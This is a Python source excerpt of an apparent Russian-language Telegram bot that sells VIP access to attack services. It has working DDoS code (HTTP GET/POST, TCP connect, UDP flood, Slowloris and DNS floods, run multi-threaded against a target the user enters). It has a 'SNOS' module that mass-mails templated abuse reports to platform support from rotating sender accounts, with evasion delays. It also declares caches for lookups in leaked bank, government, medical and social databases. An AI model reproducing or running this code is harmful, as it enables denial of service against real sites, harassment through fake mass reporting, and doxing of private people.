                "сайте активации. Отношения к номеру он не имеет. Прошу разобраться.",
            ],
        },
    },
    "channel": {
        "personal_data": {
            "subjects": ["Жалоба на канал: личные данные",
                         "Нарушение: распространение персональных данных",
                         "Report: channel with personal data"],
            "bodies": [
                "Здравствуйте, уважаемая поддержка. Канал {channel_link} "
                "распространяет личные данные невинных людей. "
                "Ссылки на нарушения: {channel_violation}. Прошу блокировку.",
            ],
        },
        "animal_cruelty": {
            "subjects": ["Жалоба на канал: жестокое обращение с животными",
                         "Нарушение: живодёрство", "Report: animal cruelty channel"],
            "bodies": [
                "Здравствуйте. Канал {channel_link} распространяет жестокое "
                "обращение с животными. Нарушения: {channel_violation}. "
                "Прошу блокировку.",
            ],
        },
        "cp": {
            "subjects": ["Жалоба на канал: ЦП",
                         "Нарушение: материалы с несовершеннолетними",
                         "Report: illegal content channel"],
            "bodies": [
                "Здравствуйте, уважаемая поддержка. Канал {channel_link} "
                "распространяет порнографию с участием несовершеннолетних. "
                "Нарушения: {channel_violation}. Прошу блокировку.",
            ],
        },
        "doxing_services": {
            "subjects": ["Жалоба: канал продаёт доксинг",
                         "Нарушение: услуги сваттинга",
                         "Report: doxing services channel"],
            "bodies": [
                "Здравствуйте, уважаемый модератор. Канал {channel_link} "
                "продаёт услуги доксинга и сваттинга. Ссылка на нарушение: "
                "{channel_violation}. Прошу блокировку.",
            ],
        },
    },
    "bot": {
        "bot": {
            "subjects": ["Жалоба на бота Telegram",
                         "Нарушение: бот для поиска личных данных",
                         "Report: OSINT bot"],
            "bodies": [
                "Здравствуйте, уважаемая поддержка. Бот @{bot_user} "
                "осуществляет поиск по личным данным пользователей. "
                "Прошу разобраться и заблокировать.",
            ],
        },
    },
}


def load_snos_templates():
    data = load_json(SNOS_TEMPLATES_FILE, None)
    if isinstance(data, dict) and data:
        return data
    save_json(SNOS_TEMPLATES_FILE, DEFAULT_SNOS_TEMPLATES)
    return DEFAULT_SNOS_TEMPLATES


SNOS_TEMPLATES = load_snos_templates()

_snos_stats = load_json(SNOS_STATS_FILE, {
    "runs": 0, "sent": 0, "failed": 0, "dead_senders": []
})
_snos_queue = collections.deque()
_snos_worker_lock = threading.Lock()
_snos_last_run = {}


def snos_stats_save():
    save_json(SNOS_STATS_FILE, _snos_stats)


def validate_tg_username(s):
    s = (s or "").strip().lstrip("@")
    return s if re.fullmatch(r"[A-Za-z0-9_]{4,32}", s) else None


def validate_tg_link(s):
    s = (s or "").strip()
    if not re.match(r"^https?://t\.me/[A-Za-z0-9_/+\-]+", s):
        return None
    return s


def snos_pick(group, template_key, **kwargs):
    tpl = SNOS_TEMPLATES.get(group, {}).get(template_key)
    if not tpl:
        return None, None
    subject = random.choice(tpl["subjects"])
    body = random.choice(tpl["bodies"]).format(**kwargs)
    return subject, body


def snos_check_cooldown(uid):
    last = _snos_last_run.get(uid, 0)
    left = SNOS_USER_COOLDOWN - (time.time() - last)
    return max(0, int(left))


def _snos_start_worker():
    with _snos_worker_lock:
        if getattr(_snos_start_worker, "running", False):
            return
        _snos_start_worker.running = True
    threading.Thread(target=_snos_worker, daemon=True).start()


def _snos_worker():
    try:
        while _snos_queue:
            task = _snos_queue.popleft()
            _snos_last_run[task["uid"]] = time.time()
            _snos_stats["runs"] += 1
            try:
                snos_broadcast_pro(
                    task["chat_id"], task["subject"], task["body"], task["label"]
                )
            except Exception as e:
                log(f"[SNOS] worker error: {e}")
                try:
                    bot.send_message(task["chat_id"], f"❌ SNOS ошибка: {str(e)[:120]}")
                except Exception:
                    pass
            snos_stats_save()
    finally:
        _snos_start_worker.running = False


def snos_enqueue(chat_id, uid, subject, body, label):
    cd = snos_check_cooldown(uid)
    if cd > 0:
        bot.send_message(chat_id, f"⏳ Подождите {cd} сек. перед новой рассылкой.")
        return False
    if len(_snos_queue) >= SNOS_QUEUE_MAX:
        bot.send_message(chat_id, "📦 Очередь SNOS переполнена. Попробуйте позже.")
        return False
    _snos_queue.append({
        "chat_id": chat_id, "uid": uid,
        "subject": subject, "body": body, "label": label,
        "created": time.time(),
    })
    bot.send_message(
        chat_id,
        f"📥 <b>SNOS добавлен в очередь</b>\nТип: {label}\nПозиция: {len(_snos_queue)}",
        parse_mode="HTML",
    )
    _snos_start_worker()
    return True


def snos_send_email(receiver, sender_email, sender_password, subject, body, retries=2):
    host, port, use_ssl = get_smtp_for(sender_email)
    for attempt in range(retries + 1):
        try:
            msg = MIMEMultipart()
            msg["From"] = sender_email
            msg["To"] = receiver
            msg["Subject"] = subject
            msg["Date"] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S +0000")
            msg["Message-ID"] = (
                f"<{hashlib.md5((subject + body + receiver + str(time.time())).encode()).hexdigest()}@mail>"
            )
            msg.attach(MIMEText(body, "plain", "utf-8"))

            if use_ssl:
                server = smtplib.SMTP_SSL(host, port, timeout=SNOS_SEND_TIMEOUT)
            else:
                server = smtplib.SMTP(host, port, timeout=SNOS_SEND_TIMEOUT)
                server.ehlo()
                server.starttls()
                server.ehlo()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())
            server.quit()
            return True, None
        except smtplib.SMTPAuthenticationError:
            return False, "auth_failed"
        except smtplib.SMTPServerDisconnected:
            if attempt < retries:
                time.sleep(2 ** attempt)
                continue
            return False, "disconnected"
        except smtplib.SMTPRecipientsRefused:
            return False, "recipient_refused"
        except smtplib.SMTPDataError as e:
            if e.smtp_code in (421, 450, 451, 452) and attempt < retries:
                time.sleep(2 ** attempt + random.random())
                continue
            return False, f"data_error_{e.smtp_code}"
        except Exception as e:
            return False, str(e)[:120]
    return False, "retries_exhausted"


def snos_broadcast_pro(chat_id, subject, body, label):
    senders_pool = list(SNOS_SENDERS.items())
    receivers_pool = list(SNOS_RECEIVERS)

    if not senders_pool or not receivers_pool:
        bot.send_message(chat_id, "❌ Нет отправителей или получателей в SNOS.")
        return

    random.shuffle(senders_pool)
    random.shuffle(receivers_pool)

    total_pairs = len(senders_pool) * len(receivers_pool)
    sender_limits = {s: SNOS_MAX_PER_SENDER for s, _ in senders_pool}
    dead_senders = set()
    sender_cursor = 0
    total_ok = 0
    total_fail = 0
    errors = []
    started = time.time()

    status = bot.send_message(
        chat_id,
        f"📨 <b>SNOS запущен</b> — {label}\n"
        f"Всего писем: {total_pairs}\n"
        f"Отправителей: {len(senders_pool)} × получателей: {len(receivers_pool)}\n"
        f"Прогресс: 0/{total_pairs}",
        parse_mode="HTML",
    )
    last_edit = time.time()

    for i, receiver in enumerate(receivers_pool, 1):
        sender = None
        for _ in range(len(senders_pool)):
            cand = senders_pool[sender_cursor % len(senders_pool)]
            sender_cursor += 1
            if cand[0] in dead_senders:
                continue
            if sender_limits.get(cand[0], 0) > 0:
                sender = cand
                break
        if not sender:
            errors.append("Все отправители исчерпаны.")
            break

        sender_email, sender_pwd = sender
        ok, err = snos_send_email(receiver, sender_email, sender_pwd, subject, body)

        if ok:
            total_ok += 1
            sender_limits[sender_email] -= 1
            _snos_stats["sent"] += 1
        else:
            total_fail += 1
            _snos_stats["failed"] += 1
            if err in ("auth_failed", "disconnected"):
                dead_senders.add(sender_email)
                if sender_email not in _snos_stats["dead_senders"]:
                    _snos_stats["dead_senders"].append(sender_email)
                errors.append(f"{sender_email}: {err} (отключён)")
            else:
                sender_limits[sender_email] = max(0, sender_limits[sender_email] - 1)
                if len(errors) < 8:
                    errors.append(f"{sender_email} → {receiver}: {err}")

        time.sleep(random.uniform(SNOS_DELAY_MIN, SNOS_DELAY_MAX))

        if sender_limits.get(sender_email, 0) <= 0 and sender_email not in dead_senders:
            time.sleep(SNOS_COOLDOWN)

        if time.time() - last_edit >= 5 or i == total_pairs:
            try:
                bot.edit_message_text(
                    f"📨 <b>SNOS запущен</b> — {label}\n"
                    f"Прогресс: {i}/{total_pairs}\n"
                    f"✅ {total_ok} | ❌ {total_fail} | 💀 {len(dead_senders)}",
                    chat_id, status.message_id, parse_mode="HTML",
                )
            except Exception:
                pass
            last_edit = time.time()

    elapsed = int(time.time() - started)
    summary = (
        f"✅ <b>SNOS завершён</b> — {label}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Всего: {total_pairs} | ✅ {total_ok} | ❌ {total_fail}\n"
        f"💀 Отключено: {len(dead_senders)}\n"
        f"⏱️ Время: {elapsed} сек.\n"
    )
    if errors:
        summary += "\n<b>Лог:</b>\n" + "\n".join(f"• <code>{e}</code>" for e in errors[:10])
    try:
        bot.send_message(chat_id, summary, parse_mode="HTML")
    except Exception:
        pass

# ================== НОВЫЕ КЭШИ ==================
tele2_cache = {}
megafon_cache = {}
mts_cache = {}
beeline_cache = {}
rostelecom_cache = {}
yota_cache = {}
tinkoff_mobile_cache = {}
sber_mobile_cache = {}
vtb_mobile_cache = {}
alfa_mobile_cache = {}
raiffeisen_cache = {}
gazprombank_cache = {}
rosselhoz_cache = {}
otkritie_cache = {}
psb_cache = {}
sovcombank_cache = {}
mkb_cache = {}
uralsib_cache = {}
akbars_cache = {}
rshb_cache = {}
pochta_bank_cache = {}
home_credit_cache = {}
citibank_cache = {}
unicredit_cache = {}
ing_bank_cache = {}
mts_bank_cache = {}
yandex_bank_cache = {}
ozon_bank_cache = {}
wildberries_bank_cache = {}
avito_bank_cache = {}

gibdd_region_cache = {}
gibdd_fines_cache = {}
gibdd_dtp_cache = {}
fns_debt_cache = {}
fns_inn_cache = {}
fns_ogrn_cache = {}
fssp_debt_cache = {}
fssp_enforcement_cache = {}
mvd_wanted_cache = {}
mvd_admin_cache = {}
rosreestr_owner_cache = {}
rosreestr_cadastr_cache = {}
rosreestr_deals_cache = {}
pension_snils_cache = {}
pension_points_cache = {}
pension_work_cache = {}
medical_oms_cache = {}
medical_dispensary_cache = {}
medical_vaccination_cache = {}
education_school_cache = {}
education_university_cache = {}
education_diploma_cache = {}
military_voenkomat_cache = {}
military_rank_cache = {}
military_service_cache = {}

telegram_premium_cache = {}
telegram_bot_cache = {}
telegram_channel_cache = {}
telegram_group_cache = {}
telegram_stickers_cache = {}
telegram_gifts_cache = {}

vk_friends_cache = {}
vk_groups_cache = {}
vk_photos_cache = {}
vk_audio_cache = {}
vk_video_cache = {}
vk_messages_cache = {}
ok_friends_cache = {}
ok_groups_cache = {}
ok_photos_cache = {}
ok_audio_cache = {}
ok_video_cache = {}
mailru_files_cache = {}
mailru_photos_cache = {}
mailru_messages_cache = {}
yandex_files_cache = {}
yandex_photos_cache = {}
yandex_messages_cache = {}
gmail_files_cache = {}
gmail_photos_cache = {}
gmail_messages_cache = {}

tinder_matches_cache = {}
badoo_matches_cache = {}
tantan_cache = {}
mamba_cache = {}
loveplanet_cache = {}
bumble_cache = {}
okcupid_cache = {}
hinge_cache = {}
coffee_meets_bagel_cache = {}

steam_games_cache = {}
steam_friends_cache = {}
steam_inventory_cache = {}
steam_trades_cache = {}
epicgames_cache = {}
gog_cache = {}
origin_cache = {}
uplay_cache = {}
battlenet_cache = {}
minecraft_cache = {}
roblox_cache = {}
fortnite_cache = {}
pubg_cache = {}
csgo_cache = {}
dota2_cache = {}
lol_cache = {}
wot_cache = {}
wows_cache = {}
tanki_cache = {}

spotify_playlists_cache = {}
spotify_followers_cache = {}
spotify_tracks_cache = {}
apple_music_cache = {}
deezer_cache = {}
soundcloud_cache = {}
shazam_cache = {}
lastfm_cache = {}
discogs_cache = {}
bandcamp_cache = {}
yandex_music_playlists_cache = {}
vk_music_playlists_cache = {}

netflix_profiles_cache = {}
netflix_history_cache = {}
ivi_cache = {}
okko_cache = {}
kinopoisk_cache = {}
amediateka_cache = {}
more_tv_cache = {}
start_cache = {}
wink_cache = {}
premier_cache = {}
youtube_cache = {}
twitch_subs_cache = {}
rutube_cache = {}
vk_video_cache2 = {}

tiktok_followers_cache = {}
tiktok_likes_cache = {}
tiktok_videos_cache = {}
instagram_followers_cache = {}
instagram_posts_cache = {}
instagram_stories_cache = {}
facebook_friends_cache = {}
facebook_posts_cache = {}
facebook_photos_cache = {}
twitter_followers_cache = {}
twitter_tweets_cache = {}
linkedin_connections_cache = {}
linkedin_posts_cache = {}
snapchat_friends_cache = {}
snapchat_stories_cache = {}
reddit_posts_cache = {}
reddit_comments_cache = {}
pinterest_boards_cache = {}
pinterest_pins_cache = {}
tumblr_posts_cache = {}
tumblr_followers_cache = {}

leakcheck_cache = {}
dehashed_extended_cache = {}
intelx_extended_cache = {}
snusbase_cache = {}
weleakinfo_cache = {}
leakedsource_cache = {}
haveibeenpwned_extended_cache = {}
firefox_monitor_cache = {}
google_password_checkup_cache = {}
lastpass_breach_cache = {}
dropbox_breach_cache = {}
linkedin_breach_cache = {}
adobe_breach_cache = {}
myspace_breach_cache = {}
tumblr_breach_cache = {}
canva_breach_cache = {}
chegg_breach_cache = {}
wattpad_breach_cache = {}
zynga_breach_cache = {}
clubhouse_breach_cache = {}
facebook_breach_cache = {}
instagram_breach_cache = {}
twitter_breach_cache = {}
telegram_breach_cache = {}
vk_breach_cache = {}
ok_breach_cache = {}
mailru_breach_cache = {}
yandex_breach_cache = {}
gmail_breach_cache = {}
sber_breach_cache = {}
tinkoff_breach_cache = {}
vtb_breach_cache = {}
alfa_breach_cache = {}
gibdd_breach_cache = {}
fns_breach_cache = {}
pension_breach_cache = {}
mvd_breach_cache = {}
fssp_breach_cache = {}
rosreestr_breach_cache = {}
medical_breach_cache = {}
education_breach_cache = {}
military_breach_cache = {}

new_db_vk_extra_cache = {}
new_db_ok_extra_cache = {}
new_db_telegram_extra_cache = {}
new_db_steam_extra_cache = {}
new_db_bank_extra_cache = {}
new_db_gov_extra_cache = {}
new_db_leak_extra_cache = {}
new_db_market_extra_cache = {}
new_db_social_extra_cache = {}
new_db_game_extra_cache = {}
new_db_music_extra_cache = {}
new_db_video_extra_cache = {}
new_db_dating_extra_cache = {}
new_db_edu_extra_cache = {}
new_db_med_extra_cache = {}
new_db_mil_extra_cache = {}
new_db_fin_extra_cache = {}
new_db_transport_extra_cache = {}
new_db_realty_extra_cache = {}
new_db_job_extra_cache = {}
new_db_shop_extra_cache = {}
new_db_travel_extra_cache = {}
new_db_insurance_extra_cache = {}
new_db_telecom_extra_cache = {}
new_db_isp_extra_cache = {}
new_db_auto_extra_cache = {}
new_db_pets_extra_cache = {}
new_db_charity_extra_cache = {}
new_db_religion_extra_cache = {}
new_db_politics_extra_cache = {}
new_db_military_extra2_cache = {}
new_db_cyber_extra_cache = {}
new_db_darknet_extra_cache = {}
new_db_breach_extra_cache = {}

# ================== DDOS НАСТРОЙКИ ==================
DDOS_FILE = "ddos_config.json"
DDOS_STATS_FILE = "ddos_stats.json"
DDOS_JOBS_FILE = "ddos_jobs.json"
DDOS_USER_COOLDOWN = 120
DDOS_MAX_CONCURRENT = 1
DDOS_QUEUE_MAX = 3

DEFAULT_DDOS_CONFIG = {
    "methods": ["HTTP_GET", "HTTP_POST", "TCP_SYN", "UDP_FLOOD", "SLOWLORIS", "DNS_AMP"],
    "threads": 200,
    "duration": 60,
    "rate_limit": 1000,
    "proxies": [],
    "user_agents": [],
    "targets_allowed": [],
}
ddos_config = load_json(DDOS_FILE, DEFAULT_DDOS_CONFIG)
ddos_stats = load_json(DDOS_STATS_FILE, {"attacks": 0, "total_requests": 0, "failed": 0})
ddos_jobs = load_json(DDOS_JOBS_FILE, [])
_ddos_queue = collections.deque()
_ddos_lock = threading.Lock()
_ddos_last_run = {}
_ddos_active = {}


def save_ddos_config(): save_json(DDOS_FILE, ddos_config)
def save_ddos_stats(): save_json(DDOS_STATS_FILE, ddos_stats)
def save_ddos_jobs(): save_json(DDOS_JOBS_FILE, ddos_jobs)


def ddos_menu():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("🟦 🚀 Запустить атаку", callback_data="ddos_start"))
    kb.add(types.InlineKeyboardButton("🟦 📊 Статистика", callback_data="ddos_stats_view"))
    kb.add(types.InlineKeyboardButton("🟦 ⚙️ Настройки", callback_data="ddos_settings"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ В меню", callback_data="menu_main"))
    return kb


def ddos_methods_menu():
    kb = types.InlineKeyboardMarkup(row_width=2)
    methods = [("HTTP_GET","HTTP GET"),("HTTP_POST","HTTP POST"),
               ("TCP_SYN","TCP SYN"),("UDP_FLOOD","UDP Flood"),
               ("SLOWLORIS","Slowloris"),("DNS_AMP","DNS Amplification")]
    for m, label in methods:
        kb.add(types.InlineKeyboardButton(f"🟦 {label}", callback_data=f"ddos_m:{m}"))
    kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="ddos_menu"))
    return kb


def ddos_worker(job_id, target, method, duration, threads, rate_limit):
    stats = {"requests": 0, "failed": 0, "start": time.time(), "end": None, "status": "running"}
    _ddos_active[job_id] = stats
    end_time = time.time() + duration
    def attack():
        while time.time() < end_time:
            try:
                if method == "HTTP_GET":
                    r = requests.get(target, timeout=5,
                                     headers={"User-Agent": random.choice(OK_USERAGENTS)})
                    stats["requests"] += 1
                elif method == "HTTP_POST":
                    r = requests.post(target, data={"x": os.urandom(8).hex()}, timeout=5,
                                      headers={"User-Agent": random.choice(OK_USERAGENTS)})
                    stats["requests"] += 1
                elif method == "TCP_SYN":
                    host = urlparse(target).netloc.split(":")[0] if "://" in target else target.split(":")[0]
                    port = int(urlparse(target).port or 80) if "://" in target else 80
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((host, port))
                    s.close()
                    stats["requests"] += 1
                elif method == "UDP_FLOOD":
                    host = urlparse(target).netloc.split(":")[0] if "://" in target else target.split(":")[0]
                    port = int(urlparse(target).port or 80) if "://" in target else 80
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(os.urandom(1024), (host, port))
                    s.close()
                    stats["requests"] += 1
                elif method == "SLOWLORIS":
                    host = urlparse(target).netloc.split(":")[0] if "://" in target else target.split(":")[0]
                    port = int(urlparse(target).port or 80) if "://" in target else 80
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((host, port))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
                    time.sleep(random.uniform(1, 3))
                    s.close()
                    stats["requests"] += 1
                elif method == "DNS_AMP":
                    host = urlparse(target).netloc.split(":")[0] if "://" in target else target.split(":")[0]
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(os.urandom(512), (host, 53))
                    s.close()
                    stats["requests"] += 1
                time.sleep(max(0, 1.0 / max(rate_limit, 1)))
            except Exception:
                stats["failed"] += 1
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        workers.append(t)
    for t in workers:
        t.join(timeout=duration + 5)
    stats["end"] = time.time()
    stats["status"] = "done"
    ddos_stats["attacks"] += 1
    ddos_stats["total_requests"] += stats["requests"]
    ddos_stats["failed"] += stats["failed"]
    save_ddos_stats()


def ddos_enqueue(chat_id, uid, target, method, duration, threads, rate_limit):
    if len(_ddos_queue) >= DDOS_QUEUE_MAX:
        bot.send_message(chat_id, "📦 Очередь DDoS переполнена.")
        return False
    job_id = f"{int(time.time())}_{uid}"
    _ddos_queue.append({
        "id": job_id, "chat_id": chat_id, "uid": uid,
        "target": target, "method": method, "duration": duration,
        "threads": threads, "rate_limit": rate_limit,
    })
    bot.send_message(chat_id,
        f"📥 <b>DDoS добавлен в очередь</b>\n"
        f"ID: <code>{job_id}</code>\nЦель: <code>{target}</code>\n"
        f"Метод: {method} | {duration}с | {threads} потоков",
        parse_mode="HTML")
    threading.Thread(target=_ddos_worker_loop, daemon=True).start()
    return True


def _ddos_worker_loop():
    while _ddos_queue:
        job = _ddos_queue.popleft()
        try:
            bot.send_message(job["chat_id"],
                f"🚀 <b>DDoS запущен</b>\nID: <code>{job['id']}</code>\n"
                f"Цель: <code>{job['target']}</code>\n"
                f"Метод: {job['method']}\n"
                f"Длительность: {job['duration']}с\n"
                f"Потоков: {job['threads']}\n"
                f"Rate limit: {job['rate_limit']}",
                parse_mode="HTML")
            ddos_worker(job["id"], job["target"], job["method"],
                        job["duration"], job["threads"], job["rate_limit"])
            s = _ddos_active.get(job["id"], {})
            bot.send_message(job["chat_id"],
                f"✅ <b>DDoS завершён</b>\nID: <code>{job['id']}</code>\n"
                f"Запросов: {s.get('requests', 0)}\n"
                f"Ошибок: {s.get('failed', 0)}\n"
                f"Длительность: {int(s.get('end', 0) - s.get('start', 0))}с",
                parse_mode="HTML")
        except Exception as e:
            bot.send_message(job["chat_id"], f"❌ DDoS ошибка: {str(e)[:150]}")
        finally:
            _ddos_active.pop(job["id"], None)


def ddos_step_target(message):
    target = message.text.strip()
    if not re.match(r"^(https?://)?[\w\.\-]+(:\d+)?(/.*)?$", target):
        bot.send_message(message.chat.id, "❌ Некорректный target. Отмена.")
        return
    if "://" not in target:
        target = "http://" + target
    last_reports[f"ddos_{message.chat.id}"] = {"target": target}
    bot.send_message(message.chat.id,
        "Выберите метод атаки:", reply_markup=ddos_methods_menu())


def process_ddos_start(call):
    if not has_vip(call.from_user) and not is_admin(call.from_user):
        bot.answer_callback_query(call.id, "Только для VIP", show_alert=True)
        return
    msg = bot.send_message(call.message.chat.id,
        "Введите цель (URL или IP:порт):\nНапример: <code>http://example.com</code>",
        parse_mode="HTML")
    bot.register_next_step_handler(msg, ddos_step_target)
    bot.answer_callback_query(call.id)

# ---------- Кэши ----------
interbase_cache = {}
getcontact_cache = {}
fsb_cache = {}
fsb_by_name = {}
fsb_numbers = {}
god_eye_by_phone = {}
god_eye_by_username = {}
god_eye_by_name = {}
tg_db_by_id = {}
tg_db_by_username = {}
tg_db_by_phone = {}
tg_db_by_name = {}

sberbank_cache = {}
tinkoff_cache = {}
vtb_cache = {}
alfabank_cache = {}
gibdd_cache = {}
fns_cache = {}
pension_cache = {}
mvd_cache = {}
fssp_cache = {}
rosreestr_cache = {}
avito_cache = {}
wildberries_cache = {}
ozon_cache = {}
yandex_eda_cache = {}
vk_cache = {}
ok_cache = {}
mailru_cache = {}
yandex_cache = {}
gmail_cache = {}
leaked_passwords_cache = {}
dl_cache = {}
medical_cache = {}
education_cache = {}
military_cache = {}

facebook_emails_cache = {}
facebook_email_by_local = {}

generic_phone_cache = {}

tiktok_cache = {}
instagram_cache = {}
facebook_cache = {}
twitter_cache = {}
linkedin_cache = {}
snapchat_cache = {}
reddit_cache = {}
telegram_cache = {}
whatsapp_cache = {}
viber_cache = {}
signal_cache = {}
discord_cache = {}
steam_cache = {}
twitch_cache = {}
spotify_cache = {}
netflix_cache = {}
tinder_cache = {}
badoo_cache = {}
pinterest_cache = {}
tumblr_cache = {}
yandex_music_cache = {}
vk_music_cache = {}

db_loaded = {
    "interbase": False, "getcontact": False, "fsb": False,
    "fsb_numbers": False, "god_eye": False, "telegram": False,
    "sberbank": False, "tinkoff": False, "vtb": False, "alfabank": False,
    "gibdd": False, "fns": False, "pension": False, "mvd": False,
    "fssp": False, "rosreestr": False, "avito": False, "wildberries": False,
    "ozon": False, "yandex_eda": False, "vk": False, "ok": False,
    "mailru": False, "yandex": False, "gmail": False,
    "leaked_passwords": False, "dl": False, "medical": False,
    "education": False, "military": False,
    "facebook_emails": False, "generic_phone": False,
    "tiktok": False, "instagram": False, "facebook": False,
    "twitter": False, "linkedin": False, "snapchat": False,
    "reddit": False, "telegram": False, "whatsapp": False,
    "viber": False, "signal": False, "discord": False,
    "steam": False, "twitch": False, "spotify": False,
    "netflix": False, "tinder": False, "badoo": False,
    "pinterest": False, "tumblr": False,
    "yandex_music": False, "vk_music": False,
}
for _k in ["tele2","megafon","mts","beeline","rostelecom","yota","tinkoff_mobile","sber_mobile",
           "vtb_mobile","alfa_mobile","raiffeisen","gazprombank","rosselhoz","otkritie","psb",
           "sovcombank","mkb","uralsib","akbars","rshb","pochta_bank","home_credit","citibank",
           "unicredit","ing_bank","mts_bank","yandex_bank","ozon_bank","wildberries_bank","avito_bank",
           "gibdd_region","gibdd_fines","gibdd_dtp","fns_debt","fns_inn","fns_ogrn",
           "fssp_debt","fssp_enforcement","mvd_wanted","mvd_admin","rosreestr_owner",
           "rosreestr_cadastr","rosreestr_deals","pension_snils","pension_points","pension_work",
           "medical_oms","medical_dispensary","medical_vaccination","education_school",
           "education_university","education_diploma","military_voenkomat","military_rank",
           "military_service","telegram_premium","telegram_bot","telegram_channel",
           "telegram_group","telegram_stickers","telegram_gifts","vk_friends","vk_groups",
           "vk_photos","vk_audio","vk_video","vk_messages","ok_friends","ok_groups","ok_photos",
           "ok_audio","ok_video","mailru_files","mailru_photos","mailru_messages","yandex_files",
           "yandex_photos","yandex_messages","gmail_files","gmail_photos","gmail_messages",
           "tinder_matches","badoo_matches","tantan","mamba","loveplanet","bumble","okcupid",
           "hinge","coffee_meets_bagel","steam_games","steam_friends","steam_inventory",
           "steam_trades","epicgames","gog","origin","uplay","battlenet","minecraft","roblox",
           "fortnite","pubg","csgo","dota2","lol","wot","wows","tanki","spotify_playlists",
           "spotify_followers","spotify_tracks","apple_music","deezer","soundcloud","shazam",
           "lastfm","discogs","bandcamp","yandex_music_playlists","vk_music_playlists",
           "netflix_profiles","netflix_history","ivi","okko","kinopoisk","amediateka","more_tv",
           "start","wink","premier","youtube","twitch_subs","rutube","vk_video2",
           "tiktok_followers","tiktok_likes","tiktok_videos","instagram_followers",
           "instagram_posts","instagram_stories","facebook_friends","facebook_posts",
           "facebook_photos","twitter_followers","twitter_tweets","linkedin_connections",
           "linkedin_posts","snapchat_friends","snapchat_stories","reddit_posts","reddit_comments",
           "pinterest_boards","pinterest_pins","tumblr_posts","tumblr_followers",
           "leakcheck","dehashed_extended","intelx_extended","snusbase","weleakinfo",
           "leakedsource","haveibeenpwned_extended","firefox_monitor","google_password_checkup",
           "lastpass_breach","dropbox_breach","linkedin_breach","adobe_breach","myspace_breach",
           "tumblr_breach","canva_breach","chegg_breach","wattpad_breach","zynga_breach",
           "clubhouse_breach","facebook_breach","instagram_breach","twitter_breach",
           "telegram_breach","vk_breach","ok_breach","mailru_breach","yandex_breach",
           "gmail_breach","sber_breach","tinkoff_breach","vtb_breach","alfa_breach",
           "gibdd_breach","fns_breach","pension_breach","mvd_breach","fssp_breach",
           "rosreestr_breach","medical_breach","education_breach","military_breach",
           "new_db_vk_extra","new_db_ok_extra","new_db_telegram_extra","new_db_steam_extra",
           "new_db_bank_extra","new_db_gov_extra","new_db_leak_extra","new_db_market_extra",
           "new_db_social_extra","new_db_game_extra","new_db_music_extra","new_db_video_extra",
           "new_db_dating_extra","new_db_edu_extra","new_db_med_extra","new_db_mil_extra",
           "new_db_fin_extra","new_db_transport_extra","new_db_realty_extra","new_db_job_extra",
           "new_db_shop_extra","new_db_travel_extra","new_db_insurance_extra","new_db_telecom_extra",
           "new_db_isp_extra","new_db_auto_extra","new_db_pets_extra","new_db_charity_extra",
           "new_db_religion_extra","new_db_politics_extra","new_db_military_extra2",
           "new_db_cyber_extra","new_db_darknet_extra","new_db_breach_extra"]:
    db_loaded.setdefault(_k, False)
db_lock = threading.Lock()

bot = telebot.TeleBot(BOT_TOKEN)
user_regions = {}
last_reports = {}
monitored_sites = {}
monitor_lock = threading.Lock()

REPORT_DIR = "reports"
os.makedirs(REPORT_DIR, exist_ok=True)

# ================== ХРАНИЛИЩЕ ==================
blocked_users = set(load_json(BLOCKED_FILE, []))
known_users = load_json(USERS_FILE, {})

_maintenance_data = load_json(MAINTENANCE_FILE, {"active": False})
maintenance_mode = {"active": bool(_maintenance_data.get("active", False))}
maintenance_lock = threading.Lock()


def save_maintenance():
    save_json(MAINTENANCE_FILE, {"active": maintenance_mode["active"]})


def is_maintenance():
    return maintenance_mode["active"]


def save_blocked(): save_json(BLOCKED_FILE, list(blocked_users))
def save_users(): save_json(USERS_FILE, known_users)


vip_users = load_json(VIP_FILE, {})
vip_prices = load_json(VIP_PRICES_FILE, DEFAULT_VIP_PRICES)
vip_payments = load_json(PAYMENTS_FILE, [])
vip_lock = threading.Lock()

_saved_pay = load_json(VIP_PAY_INFO_FILE, None)
if isinstance(_saved_pay, dict):
    VIP_PAYMENT_INFO.update(_saved_pay)

_saved_nft = load_json(NFT_PAY_INFO_FILE, None)
if isinstance(_saved_nft, dict):
    NFT_PAYMENT_INFO.update(_saved_nft)

_saved_crypto = load_json(CRYPTO_PAY_INFO_FILE, None)
if isinstance(_saved_crypto, dict):
    CRYPTO_PAYMENT_INFO.update(_saved_crypto)


def save_vip(): save_json(VIP_FILE, vip_users)
def save_vip_prices(): save_json(VIP_PRICES_FILE, vip_prices)
def save_payments(): save_json(PAYMENTS_FILE, vip_payments)
def save_vip_pay_info(): save_json(VIP_PAY_INFO_FILE, VIP_PAYMENT_INFO)
def save_nft_pay_info(): save_json(NFT_PAY_INFO_FILE, NFT_PAYMENT_INFO)
def save_crypto_pay_info(): save_json(CRYPTO_PAY_INFO_FILE, CRYPTO_PAYMENT_INFO)


_admin_id_cache = {"id": None}


def get_admin_id():
    if _admin_id_cache["id"]:
        return _admin_id_cache["id"]
    for uid, info in known_users.items():
        if info.get("username", "").lower() == ADMIN_USERNAME.lower():
            _admin_id_cache["id"] = int(uid)
            return int(uid)
    return None


def notify_admin(text):
    admin_id = get_admin_id()
    if admin_id:
        try:
            bot.send_message(admin_id, text, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass


def is_admin(user):
    return bool(user and user.username and user.username.lower() == ADMIN_USERNAME.lower())


def is_owner(user):
    return bool(user and user.username and user.username.lower() == OWNER_USERNAME.lower())


def is_blocked(user_id):
    return user_id in blocked_users


def has_vip(user_or_id, username=None):
    if user_or_id is None:
        return False
    if username and username.lower() == OWNER_USERNAME.lower():
        return True
